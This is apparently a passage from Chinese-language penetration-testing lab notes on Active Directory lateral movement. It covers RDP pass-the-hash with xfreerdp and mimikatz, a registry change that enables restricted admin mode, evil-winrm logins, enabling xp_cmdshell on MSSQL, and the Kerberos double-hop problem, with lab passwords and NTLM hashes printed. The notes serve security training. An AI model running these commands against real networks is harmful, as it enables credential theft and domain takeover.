class="line">SAM Username         : administrator</span><br><span class="line">User Principal Name  : administrator@inlanefreight.local</span><br><span class="line">Account <span class="built_in">Type</span>         : <span class="number">30000000</span> ( USER_OBJECT )</span><br><span class="line">User Account Control : <span class="number">00010200</span> ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : <span class="number">10</span>/<span class="number">27</span>/<span class="number">2021</span> <span class="number">6</span>:<span class="number">49</span>:<span class="number">32</span> AM</span><br><span class="line">Object Security ID   : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-500</span></span><br><span class="line">Object Relative ID   : <span class="number">500</span></span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: <span class="number">88</span>ad09182de639ccc6579eb0849751cf</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong-NTOWF</span> *</span><br><span class="line">    Random Value : <span class="number">4625</span>fd0c31368ff4c255a3b876eaac3d</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h1 id="Privileged-Access"><a href="#Privileged-Access" class="headerlink" title="Privileged Access"></a>Privileged Access</h1><p>在域中站稳脚跟，目标就会转向通过横向或纵向移动来进一步推进位置，以获得对其他主机的访问权限，并最终实现域入侵或其他目标，具体取决于评估的目的。</p>
<p>如果接管一个对主机或一组主机具有本地管理员权限的帐户，可以用<code>Pass-the-Hash</code>通过 SMB 协议进行身份验证。</p>
<p>没有域中任何主机的本地管理员权，可以使用其他几种方法在 Windows 域中移动：</p>
<ul>
<li><code>Remote Desktop Protocol</code>（<code>RDP</code>）</li>
<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.2">PowerShell Remoting</a> - 也称为 PSRemoting 或 Windows 远程管理 (WinRM) 访问，是一种远程访问协议，允许使用 PowerShell 在远程主机上运行命令或进入交互式命令行会话</li>
<li><code>MSSQL Server</code>- 具有 SQL Server 实例的 sysadmin 权限的帐户可以远程登录该实例并针对数据库执行查询。此访问权限可用于通过各种方法在 SQL Server 服务帐户的上下文中运行操作系统命令</li>
</ul>
<p>通过 BloodHound 枚举，以下边缘可以向展示给定用户拥有哪些类型的远程访问权限：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp">RDP</a></li>
<li><a target="_blank" rel="noopener" href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote">PS Remote</a></li>
<li><a target="_blank" rel="noopener" href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin">SQL Admin</a></li>
</ul>
<p>还可以使用 PowerView 等工具甚至内置工具来枚举这些权限。</p>
<h2 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h2><p>RDP（远程桌面协议，Remote Desktop Protocol） 是由微软开发的协议，用于在网络上实现远程连接和管理。</p>
<p>TCP 3389: 主要用于 RDP 数据传输。</p>
<p>UDP 3389: 用于增强远程桌面体验（如更流畅的视频或音频）</p>
<h3 id="enum-4"><a href="#enum-4" class="headerlink" title="enum"></a>enum</h3><p>PowerView Get-NetLocalGroupMember</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-NetLocalGroupMember</span> <span class="literal">-ComputerName</span> ACADEMY<span class="literal">-EA-MS01</span> <span class="literal">-GroupName</span> <span class="string">&quot;Remote Desktop Users&quot;</span></span><br><span class="line"></span><br><span class="line">ComputerName : ACADEMY<span class="literal">-EA-MS01</span></span><br><span class="line">GroupName    : Remote Desktop Users</span><br><span class="line">MemberName   : INLANEFREIGHT\Domain Users</span><br><span class="line">SID          : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-513</span></span><br><span class="line">IsGroup      : True</span><br><span class="line">IsDomain     : UNKNOWN</span><br></pre></td></tr></table></figure>

<p>BloodHound 通过<code>Node Info</code>选项卡上<code>Execution Rights</code>下的组成员身份继承什么类型的远程访问权限。</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729236753862.png" alt="bh_RDP_domain_users"></p>
<p>还可以通过<code>Analysis</code>选项卡并运行预构建的查询<code>Find Workstations where Domain Users can RDP</code>或<code>Find Servers where Domain Users can RDP</code>。</p>
<h3 id="connect"><a href="#connect" class="headerlink" title="connect"></a>connect</h3><h4 id="xfreerdp"><a href="#xfreerdp" class="headerlink" title="xfreerdp"></a>xfreerdp</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:host /u:uname /p:passwd</span><br><span class="line">xfreerdp /v:host /u:uname /pth:NTLM</span><br></pre></td></tr></table></figure>

<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain:INLANEFREIGHT.LOCAL /ntlm:d25ecd13fddbb542d2e16da4f9e0333d &quot;/run:mstsc.exe /restrictedadmin&quot;</span><br></pre></td></tr></table></figure>

<h3 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h3><p>禁用受限管理员模式</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729500335740.png" alt="asda"></p>
<p>设置为非禁用受限管理员模式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f</span><br><span class="line"></span><br><span class="line">reg query HKLM\System\CurrentControlSet\Control\Lsa | findstr DisableRestrictedAdmin</span><br></pre></td></tr></table></figure>

<h2 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h2><p>这也可能是低权限访问，可以使用它来搜索敏感数据或尝试提升权限，或者可能导致本地管理员访问，这可能会被利用来进一步获取访问权限。<code>Remote Management Users</code>组自 Windows 8&#x2F;Windows Server 2012 时代以来就已存在，用于在不授予本地管理员权限的情况下启用 WinRM 访问。</p>
<h3 id="enum-5"><a href="#enum-5" class="headerlink" title="enum"></a>enum</h3><p>PowerView Get-NetLocalGroupMember 枚举 <code>Remote Management Users</code>组的成员。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-NetLocalGroupMember</span> <span class="literal">-ComputerName</span> ACADEMY<span class="literal">-EA-MS01</span> <span class="literal">-GroupName</span> <span class="string">&quot;Remote Management Users&quot;</span></span><br><span class="line"></span><br><span class="line">ComputerName : ACADEMY<span class="literal">-EA-MS01</span></span><br><span class="line">GroupName    : Remote Management Users</span><br><span class="line">MemberName   : INLANEFREIGHT\forend</span><br><span class="line">SID          : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-5614</span></span><br><span class="line">IsGroup      : False</span><br><span class="line">IsDomain     : UNKNOWN</span><br></pre></td></tr></table></figure>

<p>BloodHound 中利用此自定义功能来搜索具有此类访问权限的用户。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]-&gt;(c:Computer) RETURN p2</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729237489285.png" alt="canpsremote_bh_cypherq"></p>
<h3 id="connect-1"><a href="#connect-1" class="headerlink" title="connect"></a>connect</h3><h4 id="Windows-PowerShell"><a href="#Windows-PowerShell" class="headerlink" title="Windows - PowerShell"></a>Windows - PowerShell</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$password</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&quot;Klmcargo2&quot;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$cred</span> = <span class="built_in">new-object</span> System.Management.Automation.PSCredential (<span class="string">&quot;INLANEFREIGHT\forend&quot;</span>, <span class="variable">$password</span>)</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Enter-PSSession</span> <span class="literal">-ComputerName</span> ACADEMY<span class="literal">-EA-MS01</span> <span class="literal">-Credential</span> <span class="variable">$cred</span></span><br><span class="line"></span><br><span class="line">[<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">MS01</span>]: <span class="built_in">PS</span> C:\Users\forend\Documents&gt; hostname</span><br><span class="line">ACADEMY<span class="literal">-EA-MS01</span></span><br><span class="line">[<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">MS01</span>]: <span class="built_in">PS</span> C:\Users\forend\Documents&gt; <span class="built_in">Exit-PSSession</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; </span><br></pre></td></tr></table></figure>

<h4 id="Linux-evil-winrm"><a href="#Linux-evil-winrm" class="headerlink" title="Linux - evil-winrm"></a>Linux - evil-winrm</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ evil-winrm -i 10.129.201.234 -u forend -p Klmcargo2</span><br><span class="line"># evil-winrm -i 172.16.5.5 -u forend -H NTLM</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.3</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\forend.INLANEFREIGHT\Documents&gt;</span><br></pre></td></tr></table></figure>

<h2 id="SQL-Server-Admin"><a href="#SQL-Server-Admin" class="headerlink" title="SQL Server Admin"></a>SQL Server Admin</h2><p> SQL 服务器上，通常会发现设置了 sysadmin 权限的用户和服务帐户。可以通过 Kerberoasting 或其他方式（例如 LLMNR&#x2F;NBT-NS Poisoning 或 Password Spraying ）获取具有此访问权限的帐户的凭据。另一种查找 SQL Server 凭据的方法是使用<a target="_blank" rel="noopener" href="https://github.com/SnaffCon/Snaffler">Snaffler</a>工具查找包含 SQL Server 连接字符串的 web.config 或其他类型的配置文件。</p>
<h3 id="enum-6"><a href="#enum-6" class="headerlink" title="enum"></a>enum</h3><h4 id="BloodHound-2"><a href="#BloodHound-2" class="headerlink" title="BloodHound"></a>BloodHound</h4><p>BloodHound 查找<code>SQL Admin Rights</code>权限，可以在<code>Node Info</code>选项卡中检查<code>SQLAdmin</code>，或使用此自定义 Cypher 查询进行搜索：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]-&gt;(c:Computer) RETURN p2</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729237968687.png" alt="sqladmins_bh"></p>
<h4 id="PowerUpSQL"><a href="#PowerUpSQL" class="headerlink" title="PowerUpSQL"></a>PowerUpSQL</h4><p>PowerUpSQL 枚举 MSSQL 实例，<a target="_blank" rel="noopener" href="https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet">命令速查表</a>。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Import-Module</span> .\PowerUpSQL.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-SQLInstanceDomain</span></span><br><span class="line"></span><br><span class="line">ComputerName     : ACADEMY<span class="literal">-EA-DB01</span>.INLANEFREIGHT.LOCAL</span><br><span class="line">Instance         : ACADEMY<span class="literal">-EA-DB01</span>.INLANEFREIGHT.LOCAL,<span class="number">1433</span></span><br><span class="line">DomainAccountSid : <span class="number">1500000521000170152142291832437223174127203170152400</span></span><br><span class="line">DomainAccount    : damundsen</span><br><span class="line">DomainAccountCn  : Dana Amundsen</span><br><span class="line">Service          : MSSQLSvc</span><br><span class="line">Spn              : MSSQLSvc/ACADEMY<span class="literal">-EA-DB01</span>.INLANEFREIGHT.LOCAL:<span class="number">1433</span></span><br><span class="line">LastLogon        : <span class="number">4</span>/<span class="number">6</span>/<span class="number">2022</span> <span class="number">11</span>:<span class="number">59</span> AM</span><br></pre></td></tr></table></figure>

<h3 id="connect-2"><a href="#connect-2" class="headerlink" title="connect"></a>connect</h3><h4 id="Windows-PowerUpSQL"><a href="#Windows-PowerUpSQL" class="headerlink" title="Windows - PowerUpSQL"></a>Windows - PowerUpSQL</h4><p>使用 PowerUpSQL Get-SQLQuery 针对远程 SQL Server 主机进行身份验证，并运行自定义查询或操作系统命令。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt;  <span class="built_in">Get-SQLQuery</span> <span class="literal">-Verbose</span> <span class="literal">-Instance</span> <span class="string">&quot;172.16.5.150,1433&quot;</span> <span class="literal">-username</span> <span class="string">&quot;inlanefreight\damundsen&quot;</span> <span class="literal">-password</span> <span class="string">&quot;SQL1234!&quot;</span> <span class="literal">-query</span> <span class="string">&#x27;Select @@version&#x27;</span></span><br><span class="line"></span><br><span class="line">VERBOSE: <span class="number">172.16</span>.<span class="number">5.150</span>,<span class="number">1433</span> : Connection Success.</span><br><span class="line"></span><br><span class="line">Column1</span><br><span class="line"><span class="literal">-------</span></span><br><span class="line">Microsoft SQL Server <span class="number">2017</span> (RTM) - <span class="number">14.0</span>.<span class="number">1000.169</span> (X64) ...</span><br></pre></td></tr></table></figure>

<h4 id="Linux-Impacket"><a href="#Linux-Impacket" class="headerlink" title="Linux - Impacket"></a>Linux - Impacket</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth</span><br><span class="line"># mssqlclient.py INLANEFREIGHT/uname:passwd@172.16.7.60</span><br><span class="line"></span><br><span class="line">Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed database context to &#x27;master&#x27;.</span><br><span class="line">[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) </span><br><span class="line">[!] Press help for extra shell commands</span><br></pre></td></tr></table></figure>

<p><code>help</code>命令来查看可以使用哪些命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; help</span><br><span class="line"></span><br><span class="line">     lcd &#123;path&#125;                 - changes the current local directory to &#123;path&#125;</span><br><span class="line">     exit                       - terminates the server process (and this session)</span><br><span class="line">     enable_xp_cmdshell         - you know what it means</span><br><span class="line">     disable_xp_cmdshell        - you know what it means</span><br><span class="line">     xp_cmdshell &#123;cmd&#125;          - executes cmd using xp_cmdshell</span><br><span class="line">     sp_start_job &#123;cmd&#125;         - executes cmd using the sql server agent (blind)</span><br><span class="line">     ! &#123;cmd&#125;                    - executes a local shell cmd</span><br></pre></td></tr></table></figure>

<p><code>enable_xp_cmdshell</code>启用<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15">xp_cmdshell 存储过程，</a>如果相关帐户具有适当的访问权限，则该存储过程允许通过数据库执行操作系统命令。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; enable_xp_cmdshell</span><br><span class="line"></span><br><span class="line">[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option &#x27;show advanced options&#x27; changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option &#x27;xp_cmdshell&#x27; changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br></pre></td></tr></table></figure>

<p>最后，可以运行 <code>xp_cmdshell &lt;command&gt;</code> 格式的命令。在这里，可以枚举用户在系统上拥有的权限，并看到拥有<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege">SeImpersonatePrivilege ，</a>，它可以与 <a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato">JuicyPotato</a>、<a target="_blank" rel="noopener" href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a> 或 <a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RoguePotato">RoguePotato</a> 等工具结合使用，以升级到 <code>SYSTEM</code> 级权限（具体取决于目标主机），并使用此访问权限继续实现目标。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; xp_cmdshell whoami /priv</span><br><span class="line">output                                                                             </span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------   </span><br><span class="line"></span><br><span class="line">NULL                                                                               </span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION                                                             </span><br><span class="line"></span><br><span class="line">----------------------                                                             </span><br><span class="line"></span><br><span class="line">NULL                                                                               </span><br><span class="line"></span><br><span class="line">Privilege Name                Description                               State      </span><br><span class="line"></span><br><span class="line">============================= ========================================= ========   </span><br><span class="line"></span><br><span class="line">SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   </span><br><span class="line"></span><br><span class="line">SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   </span><br><span class="line"></span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    </span><br><span class="line"></span><br><span class="line">SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    </span><br><span class="line"></span><br><span class="line">SeImpersonatePrivilege        Impersonate a client after authentication Enabled    </span><br><span class="line"></span><br><span class="line">SeCreateGlobalPrivilege       Create global objects                     Enabled    </span><br><span class="line"></span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   </span><br><span class="line"></span><br><span class="line">NULL                     </span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Kerberos-“Double-Hop”"><a href="#Kerberos-“Double-Hop”" class="headerlink" title="Kerberos “Double Hop”"></a>Kerberos “Double Hop”</h1><p>当攻击者尝试跨两个（或更多）跳转使用 Kerberos 身份验证时，会出现一个称为“双跳”的问题。该问题涉及如何为特定资源授予 Kerberos 票证。Kerberos 票证不应被视为密码。它们是来自 KDC 的签名数据片段，用于说明帐户可以访问哪些资源。当执行 Kerberos 身份验证时，会获得允许访问所请求资源（即一台机器）的”ticket”。相反，当使用密码进行身份验证时，该 NTLM Hash会存储在会话中，并且可以在其他地方使用而不会出现问题。</p>
<p>简单来说，在这种情况下，当尝试发出多服务器命令时，凭据不会从第一台机器发送到第二台机器。</p>
<p>假设有三台主机：<code>Attack host</code>–&gt; <code>DEV01</code>–&gt; <code>DC01</code>。攻击主机是企业网络内的 Parrot 盒，但未加入域。获取了域用户的一组凭据，发现他们是<code>Remote Management Users</code>DEV01 上组的一部分。想要使用它<code>PowerView</code>来枚举域，这需要与域控制器 DC01 进行通信。</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729238945350.png" alt="double_hop"></p>
<p>当使用<code>evil-winrm</code> 等工具连接到 <code>DEV01</code> 时，会使用网络身份验证进行连接，因此凭据不会存储在内存中，因此不会出现在系统中以代表用户对其他资源进行身份验证。当加载 <code>PowerView</code> 等工具并尝试查询 Active Directory 时，Kerberos 无法告诉 DC 用户可以访问域中的资源。发生这种情况的原因是用户的 Kerberos TGT（票证授予票证）票证未发送到远程会话；因此，用户无法证明自己的身份，并且命令将不再在此用户的上下文中运行。</p>
<p>换句话说，在向目标主机进行身份验证时，用户的票证授予服务 (TGS) 票证会发送到允许执行命令的远程服务，但不会发送用户的 TGT 票证。当用户尝试访问域中的后续资源时，他们的 TGT 将不会出现在请求中，因此远程服务将无法证明身份验证尝试是有效的，并且将被拒绝访问远程服务。</p>
<h2 id="Workarounds"><a href="#Workarounds" class="headerlink" title="Workarounds"></a>Workarounds</h2><p><a target="_blank" rel="noopener" href="https://posts.slayerlabs.com/double-hop/">这篇文章</a>介绍了一些解决双跳问题的方法。使用“嵌套”<code>Invoke-Command</code>在每次请求中发送凭据（在创建 PSCredential 对象之后），因此如果尝试从攻击主机向主机 A 进行身份验证并在主机 B 上运行命令，将获得许可。</p>
<p>使用域凭据连接到远程主机后，导入 PowerView，然后尝试运行命令。如下所示，收到错误，因为无法将身份验证传递给域控制器来查询 SPN 帐户。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\backupadm\Documents&gt; <span class="built_in">import-module</span> .\PowerView.ps1</span><br><span class="line"></span><br><span class="line">|S<span class="literal">-chain</span>|-&lt;&gt;<span class="literal">-127</span>.<span class="number">0.0</span>.<span class="number">1</span>:<span class="number">9051</span>-&lt;&gt;&lt;&gt;<span class="literal">-172</span>.<span class="number">16.8</span>.<span class="number">50</span>:<span class="number">5985</span>-&lt;&gt;&lt;&gt;<span class="literal">-OK</span></span><br><span class="line">|S<span class="literal">-chain</span>|-&lt;&gt;<span class="literal">-127</span>.<span class="number">0.0</span>.<span class="number">1</span>:<span class="number">9051</span>-&lt;&gt;&lt;&gt;<span class="literal">-172</span>.<span class="number">16.8</span>.<span class="number">50</span>:<span class="number">5985</span>-&lt;&gt;&lt;&gt;<span class="literal">-OK</span></span><br><span class="line"></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\backupadm\Documents&gt; <span class="built_in">get-domainuser</span> <span class="literal">-spn</span></span><br><span class="line">Exception calling <span class="string">&quot;FindAll&quot;</span> with <span class="string">&quot;0&quot;</span> argument(s): <span class="string">&quot;An operations error occurred.</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line">At C:\Users\backupadm\Documents\PowerView.ps1:<span class="number">5253</span> char:<span class="number">20</span></span><br><span class="line">+             <span class="keyword">else</span> &#123; <span class="variable">$Results</span> = <span class="variable">$UserSearcher</span>.FindAll() &#125;</span><br><span class="line">+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException</span><br><span class="line">    + FullyQualifiedErrorId : DirectoryServicesCOMException</span><br></pre></td></tr></table></figure>

<p>检查<code>klist</code>，会发现只有一个当前服务器的缓存 Kerberos 票证。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\backupadm\Documents&gt; klist</span><br><span class="line"></span><br><span class="line">Current LogonId is <span class="number">0</span>:<span class="number">0</span>x57f8a</span><br><span class="line"></span><br><span class="line">Cached Tickets: (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0&gt; Client: backupadm @ INLANEFREIGHT.LOCAL</span></span><br><span class="line">    Server: academy<span class="literal">-aen-ms0</span><span class="variable">$</span> <span class="selector-tag">@</span></span><br><span class="line">    KerbTicket Encryption <span class="built_in">Type</span>: AES<span class="literal">-256-CTS-HMAC-SHA1-96</span></span><br><span class="line">    Ticket Flags <span class="number">0</span>xa10000 -&gt; renewable pre_authent name_canonicalize</span><br><span class="line">    <span class="built_in">Start</span> Time: <span class="number">6</span>/<span class="number">28</span>/<span class="number">2022</span> <span class="number">7</span>:<span class="number">31</span>:<span class="number">53</span> (local)</span><br><span class="line">    <span class="keyword">End</span> Time:   <span class="number">6</span>/<span class="number">28</span>/<span class="number">2022</span> <span class="number">7</span>:<span class="number">46</span>:<span class="number">53</span> (local)</span><br><span class="line">    Renew Time: <span class="number">7</span>/<span class="number">5</span>/<span class="number">2022</span> <span class="number">7</span>:<span class="number">31</span>:<span class="number">18</span> (local)</span><br><span class="line">    Session Key <span class="built_in">Type</span>: AES<span class="literal">-256-CTS-HMAC-SHA1-96</span></span><br><span class="line">    Cache Flags: <span class="number">0</span>x4 -&gt; S4U</span><br><span class="line">    Kdc Called: DC01.INLANEFREIGHT.LOCAL</span><br></pre></td></tr></table></figure>

<h3 id="Workaround-1-PSCredential-Object"><a href="#Workaround-1-PSCredential-Object" class="headerlink" title="Workaround #1: PSCredential Object"></a>Workaround #1: PSCredential Object</h3><p>通过主机 A 连接到远程主机，并设置 PSCredential 对象以再次传递凭据。</p>
<p>首先，设置身份验证。</p>
